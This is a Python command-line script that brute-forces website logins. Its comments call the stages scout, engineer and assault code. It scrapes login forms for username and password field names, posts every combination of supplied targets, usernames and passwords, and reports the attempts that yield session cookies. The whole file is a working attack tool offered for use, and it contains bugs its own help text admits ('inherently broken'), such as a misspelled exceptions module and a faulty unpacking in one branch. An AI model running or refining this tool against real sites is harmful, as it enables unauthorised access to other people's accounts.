#!/usr/bin/python3.7
import sys, argparse, cssselect, lxml.html, requests
from itertools import product

#Scout code
def input_finder(html):
    tree = lxml.html.fromstring(html)
    data = {}
    user_input_keys=['uname','Uname','username']
    password_input_keys=['pass','Pass','password']
    found_tags=[]
    for input in tree.cssselect('form input'):
        if input.get('name'):
            data[input.get('name')] = input.get('value')
    for tags in data:
        if tags in user_input_keys:
            found_tags.append(tags)
        if tags in password_input_keys:
            found_tags.append(tags)
    return found_tags

#Scout Code
def input_tag_get(targets):
    r_input = []
    try:
        for i in targets:
            get_r = requests.get(i)
            r_input.append(input_finder(get_r.text))
    except request.exceptions.RequestException as error:
        print(error)
        sys.exit(1)
    return r_input

#Engineer Code
def scout_list(tags):
    user_input_tag = []
    password_input_tag = []
    for k in tags:
        user_tag, password_tag = k
        user_input_tag.append(user_tag)
        password_input_tag.append(password_tag)
    return user_input_tag,password_input_tag

#Engineer code
def read_mode(file):
    try:
        with open(file) as foxtrot:
            list = foxtrot.readlines()
    except IOError:
        print("The file called "+file+" does not exist")
        sys.exit(1)
    list = [xray.strip() for xray in list]
    return list

#Engineer code
def nested_list_payloads(*lists):
    concat = [','.join(p) for p in product(*lists)]
    split_them = [i.split(',') for i in concat]
    return split_them

#Assault code
def username_password_brute_post(list):
    try:
        for i in list:
            request = requests.Session()
            target,user_tag,password_tag,username,password = i
            post_man={user_tag:username, password_tag:password}
            login = request.post(target, post_man)
            if (login.status_code == 200 or login.status_code == 302):
                if (request.cookies != '') and (('login' in request.cookies) or ('PHPSESSID' in request.cookies)):
                    print("Valid attempt ",target,"\n"+"Status Code:",login.status_code,"\n"+"Username:",username, "\n"+"Password:",password, "\n"+"Cookie:", request.cookies,"\n")
    except request.exceptions.RequestException as error:
        print(error)
        sys.exit(1)

    return login

#For importing purposes of course, making sure everything is local
def main():
    parser = argparse.ArgumentParser( description='An inherently broken HTTP POST Request Brute forcer.',epilog="Common usage is beta.py -target -user -pass or beta.py -user_file -target_file -pass_file")
    parser.add_argument("-target","--targets", help="Please specify your target URL, for multiple use a space delimitation.", nargs='+', type=str)
    parser.add_argument("-user","--username", help="Specify usernames for logging into the site. For multiple use space delimitation", nargs='+', type=str)
    parser.add_argument("-pass","--password", help="Specify passwords for logging into the site. For multiple use space delimitation", nargs='+', type=str)
    parser.add_argument("-target_file","--targetfile", help="Specify the filepath to the target file. It must contain url's of the target site, one per line")
    parser.add_argument("-user_file","--usernamefile", help="Specify the filepath to the user file. It must contain emails or username, one per line")
    parser.add_argument("-pass_file","--passwordfile", help="Specify the filepath to the password file. It must contain passwords, one per line")
    options = parser.parse_args()

    #All the variables directly passed via the cli, read into a nessted list
    if options.targets:
        static_input_targets = []
        static_input_targets.extend(options.targets)
    if options.username:
        static_input_username = []
        static_input_username.extend(options.username)
    if options.password:
        static_input_password = []
        static_input_password.extend(options.password)

    #All the files directly passed via cli, read into seperate list
    if options.usernamefile:
        file_users  = read_mode(options.usernamefile)
    if options.targetfile:
        file_targets = read_mode(options.targetfile)
    if options.passwordfile:
        file_passwords = read_mode(options.passwordfile)

    #Mashup of static arguements
    if (options.targets and options.username and options.password):
        static_scouting = input_tag_get(static_input_targets)
        static_user_tag,static_password_tag = input_tag_get(static_scouting)
        complete_static_list = nested_list_payloads(static_input_targets,static_user_tag,static_password_tag,static_input_username,static_input_password)
        username_password_brute_post(complete_static_list)

    #Mashup of file arguements
    if (options.usernamefile and options.targetfile and options.passwordfile):
        file_scouting = input_tag_get(file_targets)
        file_user_tag, file_password_tag = scout_list(file_scouting)
        complete_file_list = nested_list_payloads(file_targets,file_user_tag,file_password_tag,file_users,file_passwords)
        username_password_brute_post(complete_file_list)

#Sanity check
    if not (len(sys.argv) > 1) or (len(sys.argv) > 2):
        print("Please refer to help beta -h or beta -help for more information.")

if __name__ == "__main__":
    main()
